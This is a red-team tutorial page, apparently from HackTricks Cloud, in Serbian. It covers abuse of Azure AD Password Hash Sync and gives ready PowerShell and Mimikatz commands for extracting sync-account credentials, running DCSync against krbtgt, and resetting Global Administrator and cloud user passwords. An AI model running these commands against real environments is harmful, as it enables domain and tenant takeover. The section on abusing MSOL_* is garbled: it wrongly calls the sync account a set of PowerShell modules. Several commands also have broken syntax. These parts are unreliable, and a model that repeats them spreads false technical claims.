# Az - PHS - Sinhronizacija heš lozinki

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne informacije

[Iz dokumentacije:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Sinhronizacija heš lozinki** je jedan od metoda prijave koji se koristi za postizanje hibridnog identiteta. **Azure AD Connect** sinhronizuje heš, heša, lozinke korisnika sa lokalnog Active Directory-ja na oblak zasnovani Azure AD.

<figure><img src="../../../../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

To je **najčešći metod** koji koriste kompanije za sinhronizaciju lokalnog AD-a sa Azure AD-om.

Svi **korisnici** i **heš lozinki** se sinhronizuju sa lokalnog na Azure AD. Međutim, **lozinke u čistom tekstu** ili **originalni heševi** se ne šalju na Azure AD.\
Osim toga, **ugrađene** bezbednosne grupe (kao što su administratorske grupe domena...) se **ne sinhronizuju** na Azure AD.

Sinhronizacija heševa se vrši svakih **2 minuta**. Međutim, podrazumevano, **istek lozinke** i **istek naloga** se **ne sinhronizuju** u Azure AD. Dakle, korisnik čija je **lozinka na lokalnom AD-u istekla** (nije promenjena) može i dalje **pristupati Azure resursima** koristeći staru lozinku.

Kada korisnik sa lokalnog AD-a želi da pristupi Azure resursu, **autentifikacija se vrši na Azure AD-u**.

**PHS** je potreban za funkcionalnosti kao što su **Identity Protection** i AAD Domain Services.

## Pivoting

Kada je PHS konfigurisan, automatski se **kreiraju** neki **privilegovani nalozi**:

* Nalog **`MSOL_<installationID>`** se automatski kreira na lokalnom AD-u. Ovom nalogu je dodeljena uloga **Directory Synchronization Accounts** (videti [dokumentaciju](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions)) što znači da ima **dozvole za replikaciju (DCSync) u lokalnom AD-u**.
* Nalog **`Sync_<ime on-prem ADConnect Server-a>_installationID`** se kreira na Azure AD-u. Ovaj nalog može **resetovati lozinku bilo kog korisnika** (sinhronizovanog ili samo u oblaku) na Azure AD-u.

Lozinke ova dva privilegovana naloga se **čuvaju u SQL serveru** na serveru gde je **Azure AD Connect instaliran**. Administratori mogu izvući lozinke ovih privilegovanih korisnika u čistom tekstu.\
Baza podataka se nalazi u `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`.

Moguće je izvući konfiguraciju iz jedne od tabela, pri čemu je jedna enkriptovana:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**Enkriptovana konfiguracija** je enkriptovana sa **DPAPI** i sadrži lozinke korisnika `MSOL_*` na lokalnom AD-u i lozinku **Sync\_\*** na Azure AD-u. Dakle, kompromitovanjem ovih lozinki moguće je dobiti privilegije na AD-u i Azure AD-u.

Možete pronaći [potpuni pregled kako se ove lozinke čuvaju i dešifruju u ovom predavanju](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### Pronalaženje **Azure AD connect server-a**

Ako je **server na kojem je instaliran Azure AD Connect** pridružen domeni (preporučeno u dokumentaciji), moguće ga je pronaći pomoću:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### Zloupotreba MSOL\_\*

MSOL\_\* (Microsoft Online Services) je skup PowerShell modula koji se koriste za upravljanje Azure AD (Active Directory) i Office 365. Ovi moduli pružaju funkcionalnosti za administraciju korisnika, grupa, licenci i drugih resursa u oblaku.

Jedna od tehnika zloupotrebe je iskorišćavanje MSOL\_\* modula za izvršavanje neovlašćenih radnji. Ovo se može postići korišćenjem ukradenih ili kompromitovanih legitimacija za pristup Azure AD ili Office 365. Nakon što se uspostavi veza sa Azure AD, napadač može izvršavati različite komande za manipulaciju korisnicima, grupama ili drugim resursima.

Ova tehnika zloupotrebe može biti posebno opasna u hibridnom okruženju, gde se koristi Azure AD Connect za sinhronizaciju identiteta između lokalnog okruženja i Azure AD. Napadač može iskoristiti ovu vezu za izvršavanje napada sa oblaka na lokalno okruženje.

Da bi se sprečila zloupotreba MSOL\_\* modula, preporučuje se primena sigurnosnih mera kao što su:

- Redovno ažuriranje i praćenje sigurnosnih zakrpa za Azure AD Connect i Office 365.
- Korišćenje snažnih lozinki i dvofaktorne autentifikacije za Azure AD i Office 365 naloge.
- Praćenje i analiza logova za otkrivanje sumnjivih aktivnosti.
- Ograničavanje privilegija pristupa MSOL\_\* modulima samo na neophodne korisnike ili grupe.

Implementacija ovih mera može pomoći u zaštiti od zloupotrebe MSOL\_\* modula i održavanju sigurnosti Azure AD i Office 365 okruženja.
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
Možete takođe koristiti [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) da biste dobili ove akreditive.
{% endhint %}

### Zloupotreba Sync\_\*

Kompromitovanjem **`Sync_*`** naloga moguće je **resetovati lozinku** bilo kog korisnika (uključujući Globalne Administratore)
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
Takođe je moguće **izmeniti lozinke samo za korisnike u oblaku** (čak i ako je to neočekivano)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
Takođe je moguće izvući lozinku ovog korisnika.

{% hint style="danger" %}
Druga opcija bi bila **dodeliti privilegovane dozvole servisnom principu**, koje **Sync** korisnik ima **dozvole** da uradi, a zatim **pristupiti tom servisnom principu** kao način za privesc.
{% endhint %}

### Bezbedno SSO

Moguće je koristiti Bezbedno SSO sa PHS, što je podložno drugim zloupotrebama. Proverite to u:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## Reference

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
